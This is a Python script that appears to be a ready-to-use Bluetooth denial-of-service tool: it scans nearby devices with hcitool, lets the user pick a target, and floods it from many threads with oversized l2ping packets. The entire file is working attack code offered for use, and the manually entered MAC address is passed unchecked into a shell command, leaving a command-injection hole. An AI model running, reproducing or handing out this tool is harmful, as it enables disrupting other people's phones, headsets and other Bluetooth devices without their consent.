#!/bin/python3

# ISC License
#
# Copyright (c) 2020 X3NO <X3NO@disroot.org> [https://github.com/X3NOOO]
#
# Permission to use, copy, modify, and/or distribute this software for any purpose
# with or without fee is hereby granted, provided that the above copyright notice
# and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH REGARD
# TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS.
# IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL
# DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
# AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION
# WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.


import os
import random
import signal
import sys
import threading


def ctrlc(_, __):
    print("\n\n\u001b[31mDetected SIGINT - exiting\u001b[0m")
    sys.exit(1)


def hello():
    print(""" ▄▄▄▄  ▄▄▄████▄▄▄█████▄████▄  
▓█████▄▓  ██▒ ▓  ██▒ ▒██▀ ▀█  
▒██▒ ▄█▒ ▓██░ ▒ ▓██░ ▒▓█    ▄ 
▒██░█▀ ░ ▓██▓ ░ ▓██▓ ▒▓▓▄ ▄██ 
░▓█  ▀█▓ ▒██▒ ░ ▒██▒ ▒ ▓███▀  
░▒▓███▀▒ ▒ ░░   ▒ ░░ ░ ░▒ ▒   
▒░▒   ░    ░      ░    ░  ▒   
 ░    ░  ░      ░    ░        
 ░                   ░ ░      
      ░              ░        """)
    print("""
\u001b[33mISC License\u001b[0m

Copyright (c) 2020\u001b[34m X3NO <X3NO@disroot.org> [https://github.com/X3NOOO] \u001b[0m

Permission to use, copy, modify, and/or distribute this software for any purpose
with or without fee is hereby granted, provided that the above copyright notice
and this permission notice appear in all copies.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH REGARD
TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS.
IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL
DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION
WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
""")
    approve = input("\u001b[34mDo you understand and agree to the above license? (\u001b[32my\u001b[34m/\u001b[31mn\u001b[34m)\u001b[0m ")

    if approve != "y":
        print("\u001b[0m\u001b[31mERR: You must agree to the license to use this software\u001b[0m")
        sys.exit(1)
    os.system("clear")


def getTarget():
    out = os.popen("hcitool scan").read()
    out = out.split("\n")[1:-1]

    # parse output
    out = [x[1:] for x in out]
    out = [x.split("\t") for x in out]
    out = [x[::-1] for x in out]

    return out


def chooseTarget(targets):
    # print targets in a 2D array
    print("\u001b[0m0: I want to enter mac address manually\u001b[0m")

    # print targets, everyone in different color
    color = 1
    for i, _ in enumerate(targets):
        print(f"\u001b[0m\u001b[3{color}m{i+1}: " + targets[i][0])
        print(f"    (MAC: {targets[i][1]})")

        # select different color
        color = (color + 1) % 6
        if color == 0:
            color = 1

    target = input("\u001b[0m\n\u001b[34mChoose target:\u001b[0m ")

    # if user choose to enter mac address manually let them do it
    if target == "0":
        return input("\u001b[0m\u001b[34mEnter mac address:\u001b[0m ")

    # checks
    if not target.isdigit():
        print("\n\u001b[0m\u001b[31mERR: Input have to be a natural number\u001b[0m")
        sys.exit(1)

    if int(target) > len(targets) or int(target) < 0:
        print("\n\u001b[0m\u001b[31mERR: Invalid target\u001b[0m")
        sys.exit(1)

    # return only mac address
    return targets[int(target)-1][1]


def attack(target, output):
    rnd = str(650 + random.randint(0, 50))
    if output:
        os.system(f"l2ping -i hci0 -s {rnd} -f {target}")
        # -s is size of packet in bytes, size greater than 600 produce Message too long error
        #    but if you want to try increase size anyway just change the rnd value
    else:
        print("Output is now suppressed")
        os.popen(f"l2ping -i hci0 -s {rnd} -f {target}").read()


def main():
    # handle sigint
    signal.signal(signal.SIGINT, ctrlc)
    
    os.system("clear")
    hello()

    # check if user is root
    if os.geteuid() != 0:
        print("\u001b[0m\u001b[31mERR: You must be root to create socket\u001b[0m")
        sys.exit(1)

    # start scanning for targets
    print("\u001b[32mScanning...\u001b[0m\n")
    targets = getTarget()

    # let user choose target
    target = chooseTarget(targets)
    os.system("clear")
    print(f"\u001b[32mTarget:\u001b[0m {target}")

    # start attack
    threads = int(input("\n\u001b[34mEnter number of threads:\u001b[0m "))
    output = not bool(input("\n\u001b[34mDo you want to hide output of l2ping (\u001b[32my\u001b[34m/\u001b[31mn\u001b[34m)\u001b[0m ") == "y")

    print("\n\u001b[34mPress ENTER to launch attack\u001b[0m", end="")
    input()    

    for i in range(threads):
        print(f"Starting thread {i+1}")
        threading.Thread(target=attack, args=[target, output]).start()
    print("\n\u001b[32mStarting attack...\u001b[0m\n")

if __name__ == '__main__':
    main()
